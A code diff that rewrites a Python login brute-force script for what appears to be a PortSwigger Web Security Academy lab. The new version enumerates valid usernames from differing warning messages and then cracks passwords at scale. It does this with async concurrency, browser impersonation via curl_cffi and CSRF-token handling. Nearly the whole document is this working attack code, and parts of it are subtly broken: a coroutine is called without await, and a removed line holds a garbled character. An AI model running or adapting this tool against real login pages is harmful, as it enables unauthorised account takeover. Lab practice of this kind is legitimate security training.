@@ -1,57 +1,113 @@
-import re
 import os
+import sys
+import asyncio
 from urllib.parse import urljoin
-import requests
+from curl_cffi.requests import AsyncSession
 from bs4 import BeautifulSoup
 
 file_user = os.path.join(os.path.dirname(os.path.abspath(__file__)), "username_candidate.txt")
 file_pass = os.path.join(os.path.dirname(os.path.abspath(__file__)), "password_candidate.txt")
 
-url_base = input('Enter home page url: ') or "https://0a4300750447d8af811f9e1200210030.web-security-academy.net"
-url_login = urljoin(url_base, "login")
+test_username = "Test_Username"
+test_password = "Test@p455w0rd"
 
-with open(file_user, "r") as f:
-    usernames = f.readlines()
-with open(file_pass, "r") as f:
-    passwords = f.readlines()
+class BruteForce:
+    def __init__(self, usernames: list[str], passwords: list[str], concurrency: int):
+        self.usernames = usernames
+        self.passwords = passwords
+        self.semaphore = asyncio.Semaphore(concurrency)
+        self.valid_usernames = []
+    
+    async def get_base_warning(self, session: AsyncSession):
+        try:
+            payload = {
+                'username': test_username,
+                'password': test_password
+            }
+            csrf_token = self._get_csrf_token(session)
+            if csrf_token: payload['csrf'] = csrf_token
+            resp = await session.post(url=login_url, data=payload)
+            if resp.status_code != 200:
+                raise ConnectionError()
+            soup = BeautifulSoup(resp.text, 'html.parser')
+            warn_msg = soup.find("p", class_='is-warning').text
+            if warn_msg is None:
+                raise ValueError()
+            self.base_warning = warn_msg
+            return True
+        except Exception as e:
+            return False
 
-print(f"There is {len(usernames)} username(s)")
+    async def _get_csrf_token(self, session: AsyncSession):
+        try:
+            resp = await session.get(url=login_url)
+            soup = BeautifulSoup(resp.text, 'html.parser')
+            csrf_input = soup.find('input', {'name':'csrf'})
+            if not csrf_input:
+                raise Exception("CSRF not found!!!")
+            else:
+                return csrf_input.get('value')
+        except Exception as e:
+            return None
 
-for username in usernames:
-    username = username.strip()
-    payload = {'username': username, 'password': '1234'}
-    r = requests.post(url_login, payload)
-    soup = BeautifulSoup(r.text, "html.parser")
-    tag = soup.find("p", class_="is-warning")
-    if tag:
-        warn = tag.getText(strip=True).lower()
-        print(f"{username} - {warn}")
-        if warn != "invalid username":
-            user = username
-            print (f"Success. The username is '{username}'")
-            break
-    else:
-        user = username
-        print (f"The username may be '{username}'")
-        break   
+    async def _check_username(self, session: AsyncSession, username: str):
+        async with self.semaphore:
+            try:
+                payload = {
+                    'username': username,
+                    'password': test_password
+                }
+                csrf_token = await self._get_csrf_token(session)
+                if csrf_token: payload['csrf'] = csrf_token
+                resp = await session.post(url=login_url, data=payload, allow_redirects=False)
+                soup = BeautifulSoup(resp.text, 'html.parser')
+                warn_msg = soup.find("p", class_='is-warning').text
+                if warn_msg != self.base_warning:
+                    print (f"[+] Found {username}")
+                    self.valid_usernames.append(username)
+                else:
+                    print(f"[*] Scanning {username}")
+            except Exception:
+                pass
 
-if (len(user)<1):
-    print("No username found")
-    quit()
+    async def _crack_password(self, session: AsyncSession, username: str, password: str):
+        async with self.semaphore:
+            try:
+                payload = {
+                    'username': username,
+                    'password': password
+                }
+                csrf_token = await self._get_csrf_token(session)
+                if csrf_token: payload['csrf'] = csrf_token
+                resp = await session.post(url=login_url, data=payload, allow_redirects=False)
+                if resp.status_code == 302:
+                    print (f"LOGIN SUCCESS: {username} : {password} ")
+            except Exception:
+                pass
+    async def run(self):
+        print ("=== STARTING BRUTE FORCE ===")
+        async with AsyncSession(impersonate="chrome142", timeout=10) as session:
+            success = await self.get_base_warning(session)
+            if not success: return
+            print(f"\n--- User Enumeration: {len(self.usernames)} users ---")
+            await asyncio.gather(*[self._check_username(session, u.strip()) for u in self.usernames])
+            if not self.valid_usernames: return
+            print(f"\n--- Password Cracking {len(self.valid_usernames)} valid username; {len(self.passwords)} passwords ---")
+            tasks = []
+            for user in self.valid_usernames:
+                for pwd in self.passwords:
+                    tasks.append(self._crack_password(session, user, pwd.strip()))
+            await asyncio.gather(*tasks)
 
-print(f"There is {len(passwords)} password(s)")
-for password in passwords:
-    password = password.strip()
-    payload = {'username': user, 'password': password}
-    r = requests.post(url_login, payload, allow_redirects=False)
-    print(f"{user} - {password}")
-    if r.status_code == 302:
-        print (f"\n[*] Username: '{user}'\n[*] Password: '{password}'\n")
-        next_path = r.headersơ['Location']
-        target = urljoin(url_base, next_path)
-        print(f"[*] Redirecting to {target}")
-        cookie = r.cookies
-        final = requests.get(target, cookies=cookie)
-        if "Log out" in final.text:
-            print("Log in successfully!!!")
-        break
+if __name__ == "__main__":
+    base_url = input("Enter your lab's base url: ")
+    login_url = urljoin(base_url, "/login")
+
+    if sys.platform == "win32": asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
+
+    usernames = open(file_user, "r").read().splitlines()
+    passwords = open(file_pass, "r").read().splitlines()
+
+    bot = BruteForce(usernames, passwords, 20)
+    asyncio.run(bot.run())
+    
